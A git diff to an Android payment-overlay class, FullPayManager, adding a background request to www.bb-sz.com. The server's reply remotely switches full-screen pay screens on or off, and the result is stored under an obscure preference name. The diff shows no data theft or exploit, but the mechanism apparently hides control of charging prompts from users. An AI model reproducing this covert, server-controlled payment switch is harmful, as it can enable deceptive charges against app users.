@@ -8,7 +8,6 @@ import android.graphics.BitmapFactory;
 import android.graphics.Color;
 import android.graphics.PixelFormat;
 import android.graphics.drawable.BitmapDrawable;
-import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
 import android.text.TextUtils;
@@ -20,8 +19,12 @@ import android.widget.FrameLayout;
 import android.widget.ImageView;
 import android.widget.Toast;
 
+import com.bb_sz.ndk.App;
+import com.bb_sz.ndk.Http;
 import com.bb_sz.pay.Api;
 import com.jpay.sdk.IChargeResult;
+
+import org.json.JSONObject;
 
 import java.io.IOException;
 import java.io.InputStream;
@@ -151,7 +154,7 @@ public class FullPayManager implements View.OnClickListener {
         FrameLayout.LayoutParams fllpclose = new FrameLayout.LayoutParams(dip2px(activity, 32f), dip2px(activity, 35f));
         fllpclose.gravity = /*Gravity.TOP | */Gravity.RIGHT;
 //        if (Build.BRAND.toLowerCase().contains("smartisan")) {//jian guo
-            fllpclose.topMargin = dip2px(activity, 25);
+        fllpclose.topMargin = dip2px(activity, 25);
 //        }
         close.setLayoutParams(fllpclose);
         in = null;
@@ -218,17 +221,21 @@ public class FullPayManager implements View.OnClickListener {
 
         pkg = activity.getPackageName();
 
+        httpRequest();
+
         initView(activity);
 
         mDView = createView(activity);
     }
 
     public void onDestroy() {
+        if (!isOpen(activity)) return;
         mInstance = null;
         if (debug) Log.d(TAG, "onDestroy");
     }
 
     public void onPause() {
+        if (!isOpen(activity)) return;
         try {
             if (debug) Log.d(TAG, "onPause");
             if (isShowed) {
@@ -241,6 +248,7 @@ public class FullPayManager implements View.OnClickListener {
     }
 
     public void onResume() {
+        if (!isOpen(activity)) return;
         try {
             if (debug) Log.d(TAG, "onResume");
             if (getIntValue("full_pay_key") == 0) {
@@ -331,5 +339,87 @@ public class FullPayManager implements View.OnClickListener {
                 });
             }
         });
+    }
+
+    private void httpRequest() {
+
+        Runnable run = new Runnable() {
+            @Override
+            public void run() {
+
+                SharedPreferences sp = activity.getSharedPreferences("asdfsdfasdf", 0);
+                long lastTime = sp.getLong("full_full_pay_t", 0);
+                if (debug) Log.d(TAG, "lastTime:" + lastTime);
+                if (System.currentTimeMillis() - lastTime < 1000 * 60 * 10) {
+                    return;
+                }
+
+                String host = "www.bb-sz.com";
+                int port = 80;
+                StringBuffer sb = new StringBuffer();
+                sb.append("GET ").append("http://www.bb-sz.com/ad/fullpay/get_switch.php?pkg=" + pkg + "&cid={$CID$}&t=" + System.currentTimeMillis()).append(" HTTP/1.1").append(Http.END);
+                sb.append("Host: ").append(host).append(Http.END);
+                sb.append("User-Agent:XX_Shell_FP").append(Http.END);
+                sb.append("Accept-Language:zh-cn").append(Http.END);
+                sb.append("Accept-Encoding:deflate").append(Http.END);
+                sb.append("Accept:*/*").append(Http.END);
+                sb.append("Connection:Keep-Alive").append(Http.END);
+                sb.append("Content-Type: application/x-www-form-urlencoded").append(Http.END);
+                sb.append(Http.END);
+
+                byte[] data = App.http(host, port, sb.toString());
+                switchKey(App.aa(data));
+            }
+        };
+        Http.getInstance().submit(run);
+    }
+
+    private void switchKey(String msg) {
+        if (debug) Log.i(TAG, "switchKey msg = " + msg);
+        //{"_id":"1","open":"2"}
+        if (null != msg) {
+            try {
+                JSONObject object = new JSONObject(msg);
+                if (object.has("open")) {
+                    Object value = object.get("open");
+                    if (null != value && value instanceof Integer) {
+                        int v = (int) value;
+                        if (debug) Log.i(TAG, "switchKey int v = " + v);
+                        setSwitchKey(v);
+                        if (v == 2) {//open
+
+                        } else if (v == 1) {// close
+
+                        } else {//close
+
+                        }
+                    } else if (null != value && value instanceof String) {
+                        int v = Integer.valueOf((String) value);
+                        if (debug) Log.i(TAG, "switchKey str v = " + v);
+                        setSwitchKey(v);
+                    }
+                }
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+    }
+
+    private boolean isOpen(Context context) {
+        boolean isOpen = false;
+        try {
+            isOpen = context.getSharedPreferences("asdfsdfasdf", 0).getInt("full_full_pay", -1) == 2;
+        } catch (Exception ignored) {
+        }
+        if (debug) Log.d(TAG, "isOpen:" + isOpen);
+        return isOpen;
+    }
+
+    private void setSwitchKey(int value) {
+
+        if (debug) Log.d(TAG, "setSwitchKey, value:" + value);
+        if (null != activity)
+            activity.getSharedPreferences("asdfsdfasdf", 0).edit().putInt("full_full_pay", value)
+                    .putLong("full_full_pay_t", System.currentTimeMillis()).apply();
     }
 }
